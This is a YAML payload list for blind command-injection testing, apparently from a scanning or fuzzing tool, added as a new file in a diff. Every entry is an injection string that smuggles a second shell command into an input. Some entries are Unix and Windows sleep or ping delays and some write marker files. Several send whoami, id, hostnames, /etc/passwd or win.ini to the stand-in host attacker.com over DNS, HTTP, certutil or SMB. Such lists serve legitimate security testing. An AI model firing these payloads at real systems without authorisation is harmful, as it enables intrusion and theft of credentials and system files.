@@ -1,0 +1,184 @@
+name: "Command Injection Blind Payloads"
+description: "Command injection payloads for blind/out-of-band detection"
+attack_type: "cmdi"
+category: "blind"
+
+payloads:
+  # Time-based (Unix)
+  - value: ";sleep 5"
+    description: "Unix sleep 5 seconds"
+    tags: ["time", "unix"]
+
+  - value: "|sleep 5"
+    description: "Unix pipe sleep"
+    tags: ["time", "unix"]
+
+  - value: "$(sleep 5)"
+    description: "Unix subshell sleep"
+    tags: ["time", "unix"]
+
+  - value: "`sleep 5`"
+    description: "Unix backtick sleep"
+    tags: ["time", "unix"]
+
+  - value: "&&sleep 5"
+    description: "Unix AND sleep"
+    tags: ["time", "unix"]
+
+  - value: "||sleep 5"
+    description: "Unix OR sleep"
+    tags: ["time", "unix"]
+
+  - value: "';sleep 5;'"
+    description: "Quote break sleep"
+    tags: ["time", "unix", "quote"]
+
+  - value: "\";sleep 5;\""
+    description: "Double quote sleep"
+    tags: ["time", "unix", "quote"]
+
+  # Time-based (Windows)
+  - value: "&ping -n 5 127.0.0.1"
+    description: "Windows ping delay"
+    tags: ["time", "windows"]
+
+  - value: "|ping -n 5 127.0.0.1"
+    description: "Windows pipe ping"
+    tags: ["time", "windows"]
+
+  - value: "&&ping -n 5 127.0.0.1"
+    description: "Windows AND ping"
+    tags: ["time", "windows"]
+
+  - value: "&timeout /t 5 /nobreak"
+    description: "Windows timeout"
+    tags: ["time", "windows"]
+
+  - value: "|powershell -c \"Start-Sleep -s 5\""
+    description: "PowerShell sleep"
+    tags: ["time", "windows", "powershell"]
+
+  # DNS-based OOB (Unix)
+  - value: ";nslookup $(whoami).attacker.com"
+    description: "DNS exfil whoami"
+    tags: ["oob", "dns", "unix"]
+
+  - value: ";host $(id).attacker.com"
+    description: "DNS exfil id"
+    tags: ["oob", "dns", "unix"]
+
+  - value: ";dig $(hostname).attacker.com"
+    description: "DNS exfil hostname"
+    tags: ["oob", "dns", "unix"]
+
+  - value: ";ping -c 1 $(whoami).attacker.com"
+    description: "Ping DNS exfil"
+    tags: ["oob", "dns", "unix"]
+
+  - value: "$(curl attacker.com/?x=$(whoami))"
+    description: "Curl OOB exfil"
+    tags: ["oob", "http", "unix"]
+
+  - value: "$(wget -q -O- attacker.com/?x=$(id))"
+    description: "Wget OOB exfil"
+    tags: ["oob", "http", "unix"]
+
+  # DNS-based OOB (Windows)
+  - value: "&nslookup %USERNAME%.attacker.com"
+    description: "Windows DNS exfil user"
+    tags: ["oob", "dns", "windows"]
+
+  - value: "&nslookup %COMPUTERNAME%.attacker.com"
+    description: "Windows DNS exfil hostname"
+    tags: ["oob", "dns", "windows"]
+
+  - value: "|powershell -c \"Resolve-DnsName $env:USERNAME.attacker.com\""
+    description: "PowerShell DNS exfil"
+    tags: ["oob", "dns", "windows", "powershell"]
+
+  # HTTP-based OOB (Unix)
+  - value: ";curl http://attacker.com/?x=$(whoami)"
+    description: "Curl HTTP OOB"
+    tags: ["oob", "http", "unix"]
+
+  - value: ";wget http://attacker.com/?x=$(id)"
+    description: "Wget HTTP OOB"
+    tags: ["oob", "http", "unix"]
+
+  - value: ";curl -d @/etc/passwd http://attacker.com/"
+    description: "Curl POST file"
+    tags: ["oob", "http", "unix", "file"]
+
+  - value: ";wget --post-file=/etc/passwd http://attacker.com/"
+    description: "Wget POST file"
+    tags: ["oob", "http", "unix", "file"]
+
+  # HTTP-based OOB (Windows)
+  - value: "|powershell -c \"Invoke-WebRequest http://attacker.com/?x=$env:USERNAME\""
+    description: "PowerShell HTTP OOB"
+    tags: ["oob", "http", "windows", "powershell"]
+
+  - value: "|powershell -c \"iwr http://attacker.com/?x=$env:COMPUTERNAME\""
+    description: "PowerShell iwr OOB"
+    tags: ["oob", "http", "windows", "powershell"]
+
+  - value: "&certutil -urlcache -split -f http://attacker.com/?x=%USERNAME%"
+    description: "Certutil HTTP OOB"
+    tags: ["oob", "http", "windows"]
+
+  # ICMP-based OOB
+  - value: ";ping -c 3 attacker.com"
+    description: "Unix ping OOB"
+    tags: ["oob", "icmp", "unix"]
+
+  - value: "&ping -n 3 attacker.com"
+    description: "Windows ping OOB"
+    tags: ["oob", "icmp", "windows"]
+
+  # SMB-based OOB (Windows)
+  - value: "&net use \\\\attacker.com\\share"
+    description: "SMB connection OOB"
+    tags: ["oob", "smb", "windows"]
+
+  - value: "&copy %SYSTEMROOT%\\win.ini \\\\attacker.com\\share\\"
+    description: "SMB file exfil"
+    tags: ["oob", "smb", "windows", "file"]
+
+  # File-based detection
+  - value: ";touch /tmp/pwned"
+    description: "Create marker file"
+    tags: ["file", "unix", "marker"]
+
+  - value: ";echo pwned > /tmp/test"
+    description: "Write to file"
+    tags: ["file", "unix", "write"]
+
+  - value: "&echo pwned > C:\\temp\\test.txt"
+    description: "Windows write file"
+    tags: ["file", "windows", "write"]
+
+  - value: "&type nul > C:\\temp\\pwned.txt"
+    description: "Windows create file"
+    tags: ["file", "windows", "marker"]
+
+  # Encoded time-based
+  - value: ";$(echo c2xlZXAgNQ== | base64 -d)"
+    description: "Base64 encoded sleep"
+    tags: ["time", "unix", "encoded"]
+
+  - value: ";$'\\x73\\x6c\\x65\\x65\\x70\\x20\\x35'"
+    description: "Hex encoded sleep"
+    tags: ["time", "unix", "encoded"]
+
+  # Conditional execution
+  - value: ";test -e /etc/passwd && sleep 5"
+    description: "Conditional sleep (file exists)"
+    tags: ["time", "unix", "conditional"]
+
+  - value: ";[ -f /etc/passwd ] && sleep 5"
+    description: "Bracket conditional sleep"
+    tags: ["time", "unix", "conditional"]
+
+  - value: "&if exist C:\\Windows\\win.ini ping -n 5 127.0.0.1"
+    description: "Windows conditional ping"
+    tags: ["time", "windows", "conditional"]
